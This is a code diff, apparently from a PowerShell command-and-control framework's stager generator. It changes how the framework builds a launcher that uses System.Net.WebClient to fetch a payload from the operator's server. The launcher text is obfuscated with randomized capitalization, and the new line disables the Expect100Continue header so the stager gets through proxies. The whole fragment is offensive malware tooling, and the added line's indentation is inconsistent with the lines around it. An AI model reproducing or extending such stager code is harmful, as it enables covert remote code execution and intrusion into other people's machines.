@@ -309,7 +309,9 @@ class Stagers:
         # get the launching URI
         URI = self.generate_launcher_uri(server, encode, pivotServer, hop)
 
-        stager = helpers.randomize_capitalization("$wc=New-Object System.Net.WebClient;")
+        # remove default Expect100Continue HTTP header (if exists, it causes squid proxy error)
+	stager = helpers.randomize_capitalization("[System.Net.ServicePointManager]::Expect100Continue = 0;")
+        stager += helpers.randomize_capitalization("$wc=New-Object System.Net.WebClient;")
         stager += "$u='"+userAgent+"';"
 
         if "https" in URI:
